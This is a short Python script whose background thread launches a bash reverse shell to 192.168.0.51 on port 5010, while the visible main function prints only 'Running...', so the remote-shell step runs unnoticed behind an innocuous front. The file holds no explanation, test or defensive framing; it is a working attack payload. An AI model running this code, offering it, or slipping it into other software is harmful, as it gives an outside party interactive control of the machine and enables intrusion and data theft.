import subprocess
import threading


def fn(n):
    try:
        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.51/5010 0<&1 2>&1", shell=True, executable="/bin/bash")
        print("Connection Established")
    except:
        print("Command Failed")
        return 0

def main():
    print("Running...")

if __name__ == "__main__":
    thread = threading.Thread(target=fn, args=(0, ))
    thread.start()
    main()
    exit(0)
